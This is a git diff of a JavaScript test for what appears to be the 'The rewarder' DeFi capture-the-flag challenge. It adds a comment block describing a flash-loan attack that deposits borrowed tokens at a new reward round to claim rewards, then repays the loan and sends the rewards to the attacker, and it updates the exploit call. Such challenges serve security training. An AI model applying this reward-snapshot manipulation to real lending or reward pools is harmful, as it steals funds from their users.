@@ -51,7 +51,6 @@ describe('[Challenge] The rewarder', function () {
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
-            // console.log(await this.rewarderPool.roundNumber());
             expect(
                 await this.rewardToken.balanceOf(users[i].address)
             ).to.be.eq(ethers.utils.parseEther('25'));
@@ -67,11 +66,21 @@ describe('[Challenge] The rewarder', function () {
         ).to.be.eq('2');
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // 1. Wait for a new round
+    // 2. Call 'flashLoan()'
+    // 3. Lending pool calls 'receiveFlashLoan()' in the receiver contract and sends DVT
+    // 4. Receiver contract deposits DVT from flash loan into the rewarder pool by calling 'deposit()'
+    // 5. Since it is a new round and the snapshot is taken after the deposit using flash loan tokens,
+    //    the rewarder pool will transfer rewards the attacker
+    // 5. 'withdraw()' is called in the rewarder pool to get the tokens back and repay the flash loan
+    // 6. Exploit contract sends reward tokens to the attacker 
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
         const TheRewarderExploit = await ethers.getContractFactory('TheRewarderExploit', deployer);
         this.exploit = await TheRewarderExploit.deploy();
-        this.exploit.exploit(this.flashLoanPool.address, this.rewarderPool.address, TOKENS_IN_LENDER_POOL);
+        this.exploit.exploit(this.flashLoanPool.address, this.rewarderPool.address, TOKENS_IN_LENDER_POOL, attacker.address);
     });
 
     after(async function () {
